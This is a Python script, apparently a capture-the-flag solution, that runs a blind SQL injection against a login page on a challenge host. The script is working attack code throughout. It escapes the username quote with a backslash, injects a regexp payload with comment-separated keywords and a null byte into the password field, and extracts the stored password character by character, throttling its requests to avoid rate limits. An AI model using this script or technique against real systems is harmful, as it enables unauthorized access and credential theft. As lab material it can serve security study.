import requests
from string import digits, ascii_letters
from urllib.parse import unquote
import time


guess_str = ascii_letters + digits + '_'

passwd = ""

url = 'http://656ae5ec-ca81-4c0d-ba70-db2c22b32f15.node5.buuoj.cn:81/index.php'

zero = unquote('%00')


for i in range(50):     # 尝试长度
    print(i)
    for j in guess_str:
        payload = passwd
        payload += j

        data = {
            "username": '\\',
            "passwd": '||/**/passwd/**/regexp/**/"^%s";%s' %(payload, zero)
        }
        
        print(data)

        resp = requests.post(url, data=data, timeout=8)
        
        if "welcome.php" in resp.text:
            passwd += j
            print(passwd)
            break
        time.sleep(0.5)     # 防429

print(passwd)